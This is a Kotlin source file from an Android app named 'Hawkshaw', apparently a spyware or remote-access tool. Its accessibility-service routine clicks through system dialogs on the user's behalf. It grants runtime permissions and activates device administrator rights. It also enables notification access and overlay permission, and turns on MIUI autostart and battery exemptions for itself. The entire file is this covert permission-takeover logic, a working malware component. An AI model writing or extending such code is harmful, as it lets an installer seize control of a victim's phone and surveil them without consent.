package com.hawkshaw.library.features.accessibility

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.util.Log // Import Log for debug logs
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.hawkshaw.library.features.accessibility.socialmedia.Researcher
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.find
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findAndClick
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst

/**
 * Utility for granting permissions automatically through accessibility service
 */
object PermissionManagerKt {
    private const val TAG = "PermissionManager"
    private var isPermissionsGranted: Boolean = false // Matches Java's static field
    private var retryCount = 0
    private const val MAX_RETRIES = 3
    private var lastProcessedEvent: Long = 0
    private const val EVENT_DEBOUNCE_MS = 500

    /**
     * Attempts to automatically grant permissions by interacting with system UI
     *
     * @param mainAccessibilityService The MainAccessibilityService instance
     * @param accessibilityEvent The current accessibility event
     */
    @RequiresApi(Build.VERSION_CODES.O)
    @JvmStatic // To ensure static behavior similar to Java
    fun grantPermissions(
        mainAccessibilityService: MainAccessibilityService,
        accessibilityEvent: AccessibilityEvent
    ) {
        Log.d(TAG, "grantPermissions() called with event: ${accessibilityEvent.eventType}") // Debug log at start
        val packageName = accessibilityEvent.packageName
        val className = accessibilityEvent.className
        val source = accessibilityEvent.source // Cannot be null check below

        if (source != null) {
            Log.d(TAG, "Source node is not null. Processing event.") // Debug log
            val sourcePackageName = accessibilityEvent.packageName
            val sourceClassName = source.className
            val textList = accessibilityEvent.text
            val sourceText = textList.firstOrNull()

            log("PKG: $sourcePackageName, Class: $sourceClassName, Text: $textList -- $className") // Original log

            // Replicate Java's if-else if-else structure for package names
            if (packageName == "com.google.android.permissioncontroller" || packageName == "com.android.permissioncontroller") {
                Log.d(TAG, "Handling permission controller package: $packageName") // Debug log
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Log.d(TAG, "API >= R (30). Attempting foreground/allow buttons.") // Debug log
                    val clickedForeground = source.findAndClick("com.android.permissioncontroller:id/permission_allow_foreground_only_button")
                    Log.v(TAG, "Clicked foreground button: $clickedForeground") // Verbose log
                    if (!clickedForeground) {
                        val clickedAllow = source.findAndClick("com.android.permissioncontroller:id/permission_allow_button")
                        Log.v(TAG, "Clicked allow button: $clickedAllow") // Verbose log
                        if (!clickedAllow) {
                            val clickedAlways = source.findAndClick("com.android.permissioncontroller:id/permission_allow_always_button")
                            Log.v(TAG, "Clicked allow always button: $clickedAlways") // Verbose log
                        }
                    }
                } else {
                    Log.d(TAG, "API < R (30). Attempting allow always/allow buttons.") // Debug log
                    val clickedAlways = source.findAndClick("com.android.permissioncontroller:id/permission_allow_always_button")
                    Log.v(TAG, "Clicked allow always button: $clickedAlways") // Verbose log
                    if (!clickedAlways) {
                        val clickedAllow = source.findAndClick("com.android.permissioncontroller:id/permission_allow_button")
                        Log.v(TAG, "Clicked allow button: $clickedAllow") // Verbose log
                    }
                }
            } else if (packageName == "com.google.android.packageinstaller") {
                Log.d(TAG, "Handling package installer package: $packageName") // Debug log
                Researcher.printTree(source, 0)
                Log.d(TAG, "Called Researcher.printTree.") // Debug log
                val clickedPackageInstallerAllow = source.findAndClick("com.android.packageinstaller:id/permission_allow_button")
                Log.v(TAG, "Clicked package installer allow button: $clickedPackageInstallerAllow") // Verbose log
                if (!clickedPackageInstallerAllow) {
                    val clickedDeny = source.findAndClick("com.android.packageinstaller:id/permission_deny_button")
                    Log.v(TAG, "Clicked package installer deny button (if allow failed): $clickedDeny") // Verbose log
                }
            } else if (packageName == "com.android.settings") {
                Log.d(TAG, "Handling Android settings package: $packageName, Class: $className") // Debug log
                if (className == "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd") {
                    Log.d(TAG, "Handling DeviceAdminAdd screen.") // Debug log
                    val result = source.findAndClick("com.android.settings:id/action_button")
                    log("X: $result") // Original log
                    Log.v(TAG, "Clicked action button on DeviceAdminAdd: $result") // Verbose log
                } else if (className == "android.app.Dialog") {
                    Log.d(TAG, "Handling generic Android Dialog.") // Debug log
                    val result = source.findAndClick("android:id/button1")
                    log("X: $result") // Original log
                    Log.v(TAG, "Clicked button1 on Android Dialog: $result") // Verbose log
                } else if (className == "com.android.settings.Settings\$NotificationAccessSettingsActivity") {
                    Log.d(TAG, "Handling NotificationAccessSettingsActivity.") // Debug log
                    val titles = source.findAccessibilityNodeInfosByViewId("android:id/title")
                    val checkboxes = source.findAccessibilityNodeInfosByViewId("android:id/checkbox")
                    Log.v(TAG, "Found ${titles.size} titles and ${checkboxes.size} checkboxes.") // Verbose log

                    var i5 = 0
                    for (next in titles) { // Iterate over `titles` directly
                        val accessibilityNodeInfo = next
                        val titleText = accessibilityNodeInfo?.text
                        Log.v(TAG, "Processing notification title: $titleText (index $i5)") // Verbose log

                        if (titleText == "Settings") {
                            Log.d(TAG, "Found 'Settings' title. Attempting to click checkbox.") // Debug log
                            val accessibilityNodeInfo2 = checkboxes.getOrNull(i5)
                            val valueOf = accessibilityNodeInfo2?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            log("X: $valueOf") // Original log
                            Log.v(TAG, "Checkbox click result (X): $valueOf") // Verbose log

                            val bundle = Bundle()
                            bundle.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 1)
                            val accessibilityNodeInfo3 = checkboxes.getOrNull(i5)
                            val valueOf2 = accessibilityNodeInfo3?.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, bundle)
                            log("Y: $valueOf2") // Original log
                            Log.v(TAG, "Checkbox set selection result (Y): $valueOf2") // Verbose log
                        }
                        i5++ // Increment i5 explicitly
                    }
                } else if (className == "android.app.AlertDialog") { // MIUI specific AlertDialog
                    Log.d(TAG, "Handling Android AlertDialog (potentially MIUI specific).") // Debug log
                    val titleNodes = source.findAccessibilityNodeInfosByViewId("miui:id/alertTitle")
                    val accessibilityNodeInfo4 = titleNodes.firstOrNull()
                    val text2 = accessibilityNodeInfo4?.text
                    Log.v(TAG, "AlertDialog title text: $text2") // Verbose log

                    val buttons = source.findAccessibilityNodeInfosByViewId("android:id/button1")
                    val accessibilityNodeInfo5 = buttons.firstOrNull()
                    Log.v(TAG, "AlertDialog button1 found: ${accessibilityNodeInfo5 != null}") // Verbose log

                    var bool: Boolean? = null
                    if (text2 == null || !text2.contains("Hawkshaw", ignoreCase = true)) {
                        Log.d(TAG, "AlertDialog title does not contain 'Hawkshaw' or is null. Not clicking.") // Debug log
                        bool = false
                    } else if (accessibilityNodeInfo5 != null) {
                        Log.d(TAG, "AlertDialog title contains 'Hawkshaw'. Attempting to click button1.") // Debug log
                        bool = accessibilityNodeInfo5.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }

                    Handler().postDelayed({
                        Log.d(TAG, "Post-delayed action for AlertDialog. bool=$bool") // Debug log
                        if (bool == true) {
                            mainAccessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                            Log.d(TAG, "Performed GLOBAL_ACTION_BACK.") // Debug log
                        }
                    }, 100)
                    log("X: $bool") // Original log
                    Log.v(TAG, "AlertDialog click result (X): $bool") // Verbose log
                } else if (className == "com.android.settings.Settings\$AppDrawOverlaySettingsActivity") {
                    Log.d(TAG, "Handling AppDrawOverlaySettingsActivity.") // Debug log
                    val frames = source.findAccessibilityNodeInfosByViewId("android:id/widget_frame")
                    val accessibilityNodeInfo6 = frames.firstOrNull()
                    Log.v(TAG, "Widget frame found: ${accessibilityNodeInfo6 != null}") // Verbose log

                    var bool: Boolean? = null
                    val parent3 = accessibilityNodeInfo6?.parent
                    if (parent3 != null) {
                        Log.d(TAG, "Found parent of widget frame. Attempting click.") // Debug log
                        bool = parent3.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                    log("X: $bool, $accessibilityNodeInfo6") // Original log
                    Log.v(TAG, "AppDrawOverlaySettingsActivity click result (X): $bool, Node: $accessibilityNodeInfo6") // Verbose log
                } else {
                    log("Reached NotificationFilterActivity. Add specific handling if required.") // Original log
                    Log.d(TAG, "Unhandled settings screen: $className") // Debug log
                }
            } else if (packageName == "com.miui.securitycenter") {
                Log.d(TAG, "Handling MIUI security center package: $packageName, Class: $className") // Debug log
                if (className == "com.miui.permcenter.permissions.PermissionsEditorActivity") {
                    Log.d(TAG, "Handling PermissionsEditorActivity.") // Debug log
                    val titles = source.findAccessibilityNodeInfosByViewId("android:id/title")
                    Log.v(TAG, "Found ${titles.size} titles in PermissionsEditorActivity.") // Verbose log
                    for (accessibilityNodeInfo7 in titles) {
                        val valueOf3 = accessibilityNodeInfo7?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        log("X: $valueOf3") // Original log
                        Log.v(TAG, "Clicked title in PermissionsEditorActivity: $valueOf3") // Verbose log
                    }
                } else if (className == "miui.app.AlertDialog") {
                    Log.d(TAG, "Handling MIUI app AlertDialog.") // Debug log
                    val result = source.findAndClick("android:id/text1")
                    log("X: $result") // Original log
                    Log.v(TAG, "Clicked text1 in MIUI AlertDialog: $result") // Verbose log
                } else if (className == "com.miui.appmanager.ApplicationsDetailsActivity") {
                    Log.d(TAG, "Handling ApplicationsDetailsActivity.") // Debug log
                    val findFirst = source.findFirst("com.miui.securitycenter:id/am_applabel_title")
                    val text3 = findFirst?.text
                    Log.v(TAG, "App label title text: $text3") // Verbose log

                    if (text3 != null && text3.contains("Hawkshaw", ignoreCase = false)) {
                        Log.d(TAG, "App label contains 'Hawkshaw'. Proceeding.") // Debug log
                        val findFirst2 = source.findFirst("com.miui.securitycenter:id/am_switch")
                        Log.v(TAG, "Switch found: ${findFirst2 != null}, isChecked: ${findFirst2?.isChecked}") // Verbose log

                        if (findFirst2 == null || findFirst2.isChecked) {
                            Log.d(TAG, "Switch is null or checked. Checking notification/battery settings.") // Debug log
                            val find = source.find("com.miui.securitycenter:id/tv_title")
                            val find2 = source.find("com.miui.securitycenter:id/tv_summary")
                            val accessibilityNodeInfo8 = find.getOrNull(4)
                            val accessibilityNodeInfo9 = find2.getOrNull(2)
                            val text4 = accessibilityNodeInfo9?.text
                            log("Noti Summary: $text4") // Original log
                            Log.v(TAG, "Notification summary text: $text4") // Verbose log

                            var bool: Boolean? = null

                            if (accessibilityNodeInfo9?.text == "Yes") {
                                Log.d(TAG, "Notification summary is 'Yes'. Attempting to click parent.") // Debug log
                                val parent = accessibilityNodeInfo8?.parent
                                val parent2 = parent?.parent
                                if (parent2 != null) {
                                    bool = parent2.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                }
                                log("X: $bool, NOTI") // Original log
                                Log.v(TAG, "Notification click result (X, NOTI): $bool") // Verbose log
                                return // return from grantPermissions as in Java
                            }
                            val accessibilityNodeInfo10 = find?.getOrNull(6)
                            Log.d(TAG, "Notification summary is not 'Yes'. Attempting battery setting click.") // Debug log

                            bool = accessibilityNodeInfo10?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            log("X: $bool, BATTERY - $accessibilityNodeInfo10") // Original log
                            Log.v(TAG, "Battery setting click result (X, BATTERY): $bool, Node: $accessibilityNodeInfo10") // Verbose log
                            return // return from grantPermissions as in Java
                        } else {
                            Log.d(TAG, "Switch is not null and not checked. Attempting auto-start click.") // Debug log
                            val performAction = findFirst2.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            log("X: $performAction, AUTO-START") // Original log
                            Log.v(TAG, "Auto-start click result (X, AUTO-START): $performAction") // Verbose log
                            source.refresh()
                            Log.d(TAG, "Source refreshed after auto-start click.") // Debug log
                        }
                    } else {
                        Log.d(TAG, "App label does not contain 'Hawkshaw'. Skipping MIUI handling for this app.") // Debug log
                    }
                }
            } else {
                Log.d(TAG, "Unhandled package: $packageName, class: $className") // Debug log for unhandled cases
            }
        } else {
            Log.w(TAG, "Source AccessibilityNodeInfo is null for event: ${accessibilityEvent.eventType}. Cannot grant permissions.") // Warning log for null source
        }
        Log.d(TAG, "grantPermissions() finished for event: ${accessibilityEvent.eventType}.") // Debug log at end
    }

    /**
     * Log debug message to Logcat.
     *
     * @param message The message to log.
     */
    @JvmStatic // To ensure static behavior similar to Java
    private fun log(message: String) {
        Log.d(TAG, message)
    }
}